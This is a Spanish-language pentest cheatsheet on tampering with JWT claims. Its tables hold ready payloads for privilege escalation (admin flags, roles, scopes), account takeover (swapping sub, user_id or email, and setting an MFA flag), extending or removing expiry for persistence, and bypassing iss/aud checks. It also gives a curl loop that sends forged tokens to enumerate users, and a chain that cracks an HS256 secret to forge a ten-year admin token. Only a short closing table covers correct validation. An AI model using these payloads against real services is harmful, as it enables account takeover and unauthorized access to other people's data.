---
aliases:
  - JWT Claims Tampering
  - JWT Privilege Escalation
  - JWT Account Takeover
tags:
  - type/cheatsheet
  - vuln/jwt
  - vuln/auth-bypass
  - technique/privilege-escalation
  - asset/web-app
  - cred/jwt
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[JWT Atacks]]"
---
# JWT - Manipulación de Claims

***

## Privilege Escalation

| **Objetivo** | **Claim modificado** | **Notas** |
|:---:|:---:|:---:|
| Bool admin flag | `{"isAdmin":true}` ← `false` | Backends que mapean claim a boolean. |
| Role string | `{"role":"admin"}` ← `"user"` | Variantes: `"administrator"` / `"root"` / `"superuser"`. |
| Role array | `{"roles":["admin","user"]}` ← `["user"]` | Listas — agregar admin sin remover existente. |
| Permissions array | `{"permissions":["*"]}` o `{"permissions":["read","write","delete"]}` | Wildcard o granular. |
| Scope OAuth2 | `{"scope":"admin read write"}` ← `"read"` | Space-separated scopes. |
| Tier / Plan | `{"plan":"enterprise"}` ← `"free"` | Bypass de paywall. |
| Multi-tenant tenant_id | `{"tenant_id":"victim_tenant"}` ← `"my_tenant"` | Lateral pivot entre tenants. |
| Group membership | `{"groups":["admins","users"]}` ← `["users"]` | LDAP-style. |
| Custom flags | `{"can_delete":true,"can_export":true}` | Identificar flags custom enumerando. |
| Combine con weak alg | Modificar claim + alg=none / weak secret | Ver `JWT - Ataques al Algoritmo`. |
^jwt-claims-privesc

### Identificación de claims sensibles

```bash
# Decodificar payload + listar todos los keys
echo "<jwt>" | cut -d. -f2 | base64 -d 2>/dev/null | jq 'keys'

# Buscar claims sospechosos
echo "<jwt>" | cut -d. -f2 | base64 -d 2>/dev/null | jq | grep -iE 'admin|role|priv|scope|perm|access|tier|plan'
```

___

## Account Takeover

| **Objetivo** | **Claim modificado** | **Notas** |
|:---:|:---:|:---:|
| Sub claim swap | `{"sub":"victim@target.com"}` ← `"me@target.com"` | Subject = identificador de usuario. |
| user_id swap | `{"user_id":1}` ← `1337` | Numérico — IDOR-style. |
| email swap | `{"email":"admin@target.com"}` ← `"me@target.com"` | Backends que confían en email del JWT. |
| username | `{"username":"admin"}` | Variante de sub. |
| uid LDAP | `{"uid":"administrator"}` | Stack LDAP/AD. |
| Legacy `id` | `{"id":1}` ← `1337` | DB-style ID. |
| Force password reset | Forge JWT de victim → request endpoint reset → atacante recibe link | Si app valida token JWT como auth para reset. |
| Bypass MFA | `{"mfa_verified":true}` ← `false` | Si claim controla estado MFA. |
| Long-lived token | Combinar takeover + extender exp → persistencia. | Ver Bypass temporal abajo. |
| Combine con header injection | Account takeover + jku/jwk inject = forge sin secret | Ver `JWT - Inyección en Headers`. |
^jwt-claims-takeover

### Buscar IDs alternativos

```bash
# Si encontrás user_id=42 → enumerar
for i in 1 2 3 1000 1337 admin root; do
  forge_jwt user_id=$i
  curl -H "Authorization: Bearer <forged>" target/api/me
done
```

___

## Bypass de Validación Temporal

| **Objetivo** | **Claim modificado** | **Notas** |
|:---:|:---:|:---:|
| Extender exp | `{"exp": 9999999999}` | Año 2286 — token válido casi para siempre. |
| Remover exp | `{}` (delete claim) | Algunos validators tratan ausente como nunca expira. |
| Set exp future | `{"exp": 1799999999}` | Una década en el futuro. |
| nbf en pasado | `{"nbf": 0}` | "Not before" — usar token desde epoch. |
| iat manipulation | `{"iat": 1}` | Issued-at falso — bypass de freshness checks. |
| jti reuse | Reutilizar `jti` (JWT ID) si backend no implementa replay protection. | Replay attack. |
| Clock skew abuse | Forge `exp` 30s después de expiración real | Backends con tolerancia >0 lo aceptan. |
| Token "renovado" | Modificar exp pero firma queda obsoleta | Solo funciona si validation ignora firma o secret leak. |
| Force exp 0 | `{"exp": 0}` | Algunos libs interpretan 0 como "sin expiración". |
| Type confusion | `{"exp":"99999"}` (string) ← integer | Algunos parsers fail-open en type mismatch. |
^jwt-claims-temporal

### Cómo encadenar con secret bruteforce

```
1. Token válido user normal (exp en 5 min).
2. Crack secret (HS256) — ver `JWT - Ataques al Algoritmo`.
3. Forge nuevo token con exp en 10 años + role=admin.
4. Persistencia indefinida.
```

___

## Bypass iss / aud

| **Objetivo** | **Claim modificado** | **Notas** |
|:---:|:---:|:---:|
| Concepto | `iss` (issuer) y `aud` (audience) restringen origen y target del token. Backends laxos no validan o validan parcial. | Multi-tenant / multi-audience. |
| Cross-tenant token reuse | Token de tenant_A → modificar `iss` a tenant_B → si validator no chequea iss → autenticado en B | Lateral entre orgs. |
| aud swap | `{"aud":"https://api.victim.com"}` ← `"https://api.legit.com"` | Bypass de audience binding. |
| iss = trusted alt | `{"iss":"https://accounts.google.com"}` | Si backend acepta múltiples IdPs sin separar keys. |
| iss confusion entre IdPs | Forge token con `iss` apuntando a IdP del atacante + jku al JWKS del atacante | Combinar con `JWT - Inyección en Headers`. |
| Force missing iss/aud | Eliminar `iss` y `aud` del payload | Validators fail-open ignoran si ausentes. |
| Empty string | `{"iss":""}` / `{"aud":""}` | String vacío — algunos validators no comparan. |
| Array audience | `{"aud":["legit","victim"]}` ← `"legit"` | Lista — incluir multiple audiences. |
| Wildcard | `{"aud":"*"}` | Si backend hace glob match. |
| Issuer subdomain | `{"iss":"https://attacker.target.com"}` ← `"https://target.com"` | Bypass por prefix matching. |
^jwt-claims-iss-aud

### Validación correcta vs. laxa

| Check | Correcto | Laxo (vulnerable) |
|---|---|---|
| `iss` | Compara contra string literal trusted | Ignora claim |
| `aud` | Compara contra string/array exacto | Compara con `startsWith` / regex |
| `exp` | Compara con `now()` con clock skew ≤ 60s | Skew enorme o ignora |
| `nbf` | Compara con `now()` | Ignora |
| `jti` | Tracking en DB para replay | No hay tracking |

***
